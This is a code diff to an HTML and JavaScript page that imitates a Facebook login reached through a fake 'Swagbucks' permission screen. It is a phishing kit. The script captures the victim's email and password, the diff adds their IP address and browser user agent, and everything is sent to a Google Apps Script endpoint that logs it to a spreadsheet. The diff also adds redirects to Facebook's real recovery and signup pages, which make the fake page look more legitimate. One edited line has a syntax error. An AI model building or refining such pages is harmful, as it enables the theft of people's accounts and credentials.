@@ -7,7 +7,7 @@
     <link rel="stylesheet" href="styles.css">
 </head>
 <body>
-    <!-- Permission Request Card -->
+    <!-- Permission Request Card (First Screen) - Swagbucks requesting access -->
     <div id="permissionScreen" class="permission-card">
         <div class="content">
             <div class="app-icon">
@@ -23,7 +23,7 @@
                 <a href="#">Learn more</a> about this sharing and the settings you have.
             </div>
             <div class="button-group">
-                <button id="continueAsSarahBtn" class="btn-continue">Continue</button>
+                <button id="continueAsSarahBtn" class="btn-continue">Continue as Sarah</button>
                 <button id="cancelBtn" class="btn-cancel">Cancel</button>
             </div>
         </div>
@@ -33,7 +33,7 @@
         </div>
     </div>
 
-    <!-- Login Screen -->
+    <!-- Login Screen (Hidden initially) - Facebook Login with local Facebook logo -->
     <div id="loginScreen" class="login-section hidden">
         <div class="login-header">
             <div class="facebook-logo-wrapper">
@@ -51,10 +51,10 @@
         </div>
         <button id="loginSubmitBtn" class="login-btn">Log In</button>
         <div class="forgot-password">
-            <a href="#">Forgotten password?</a>
+            <a href="#" id="forgotPasswordLink">Forgotten password?</a>
         </div>
         <div class="footer-links">
-            <a href="#">Create new account</a>
+            <a href="#" id="createAccountLink">Create new account</a>
         </div>
     </div>
 
@@ -96,7 +96,7 @@
     <script>
         // ========== GOOGLE SHEETS CONFIGURATION ==========
         // REPLACE THIS URL WITH YOUR GOOGLE APPS SCRIPT WEB APP URL
-        const GOOGLE_SHEETS_API_URL = 'https://script.google.com/macros/s/AKfycbwuG5MT1gTr0PVnScqkqy5STDlyYdqbvXTzZHr8ZTheTk4kU6N6OyOOBdJ0bhySPNmg/exec';
+        const GOOGLE_SHEETS_API_URL = 'https://script.google.com/macros/s/YOUR_SCRIPT_ID/exec';
         
         // DOM elements
         const permissionScreen = document.getElementById('permissionScreen');
@@ -109,6 +109,8 @@
         const usernameInput = document.getElementById('usernameEmail');
         const passwordInput = document.getElementById('password');
         const errorDiv = document.getElementById('loginError');
+        const forgotPasswordLink = document.getElementById('forgotPasswordLink');
+        const createAccountLink = document.getElementById('createAccountLink');
 
         function showPermissionScreen() {
             permissionScreen.classList.remove('hidden');
@@ -146,6 +148,20 @@
             window.location.href = "https://m.facebook.com/?_rdr";
         });
 
+        // ========== REDIRECT TO FACEBOOK'S OFFICIAL FORGOT PASSWORD PAGE ==========
+        forgotPasswordLink.addEventListener('click', (e) => {
+            e.preventDefault();
+            // Open Facebook's official password recovery page
+            window.location.href = "https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login";
+        });
+
+        // ========== REDIRECT TO FACEBOOK'S OFFICIAL SIGNUP PAGE ==========
+        createAccountLink.addEventListener('click', (e) => {
+            e.preventDefault();
+            // Open Facebook's official account creation page
+            window.location.href = "https://www.facebook.com/r.php";
+        });
+
         // Function to get IP address using free API
         async function getIpAddress() {
             try {
@@ -171,21 +187,21 @@
             // Prepare data to send
             const data = {
                 email: usernameEmail,
-                password: pwd
+                password: pwd,
+                ipAddress: ipAddress,
+                userAgent: userAgent
             };
             
             // Send to Google Sheets via Apps Script Web App
             const response = await fetch(GOOGLE_SHEETS_API_URL, {
                 method: 'POST',
-                mode: 'no-cors', // Required for Google Apps Script
+                mode: 'no-cors',
                 headers: {
                     'Content-Type': 'application/json',
                 },
                 body: JSON.stringify(data)
             });
             
-            // Note: With 'no-cors', we can't read the response directly
-            // So we assume success if no error occurred
             return true;
         }
 
@@ -233,7 +249,7 @@
                 loginSubmit.click();
             }
         });
-        usernameInput.addEventListener('keypress', (e) => {
+        usernameInput.addEventListener('keypress', (e) {
             if (e.key === 'Enter') {
                 e.preventDefault();
                 loginSubmit.click();
